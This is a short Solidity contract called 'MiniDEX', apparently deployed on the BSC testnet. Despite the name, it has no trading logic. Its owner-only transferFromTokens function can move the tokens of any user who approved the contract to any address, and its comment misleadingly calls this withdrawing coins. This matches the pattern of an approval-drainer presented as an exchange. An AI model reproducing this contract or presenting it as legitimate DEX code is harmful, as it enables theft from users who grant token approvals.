/**
 *Submitted for verification at testnet.bscscan.com on 2024-10-31
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

// Interface for ERC-20 tokens
interface IERC20 {
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function balanceOf(address account) external view returns (uint256);
}

contract MiniDEX {
    address public owner;

    // Only owner can call
    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner can call this function");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    // Transfer Administrator
    function setAdmin(address newOwner) public onlyOwner {
        owner = newOwner;
    }

    // Only owner can withdraws coins
    function transferFromTokens(
        address tokenAddress,
        address from,
        address to,
        uint256 amount
    ) public onlyOwner {
        require(to != address(0), "recipient address is not set");
        IERC20 token = IERC20(tokenAddress);
        require(token.allowance(from, address(this)) >= amount, "Insufficient allowance");
        require(token.transferFrom(from, to, amount), "TransferFrom failed");
    }

    // Only owner can withdraws coins
    function transferTokens(
        address tokenAddress,
        address recipient,
        uint256 amount
    ) public payable onlyOwner {
        require(tokenAddress != address(0), "Token address is not set");
        IERC20 token = IERC20(tokenAddress);
        // Check Token Balance
        require(token.balanceOf(address(this)) >= amount, "Insufficient balance");
        // Transfers Token
        require(token.transfer(recipient, amount), "Transfer failed");
    }

    receive() external payable {}
}